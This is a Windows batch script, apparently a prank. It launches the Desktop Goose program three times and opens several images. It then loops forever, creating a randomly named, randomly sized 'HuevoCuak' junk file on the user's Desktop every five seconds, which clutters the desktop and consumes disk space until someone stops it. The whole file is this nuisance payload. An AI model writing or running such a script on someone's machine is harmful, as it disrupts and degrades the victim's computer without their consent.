@echo off

rem -----------------------
start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
start "" "%USERPROFILE%\Goose\GooseDesktop.exe"
start /B "" "%USERPROFILE%\adds\1.jpg"
start /B "" "%USERPROFILE%\adds\2.jpg"
start /B "" "%USERPROFILE%\adds\3.jpg"
start /B "" "%USERPROFILE%\adds\4.jpg"
start /B "" "%USERPROFILE%\adds\3.jpg"
rem -----------------------

:loop
timeout /nobreak 5 >nul
fsutil file createnew %USERPROFILE%\Desktop\HuevoCuak.%random% %random%00
call :loop
:endloop

exit
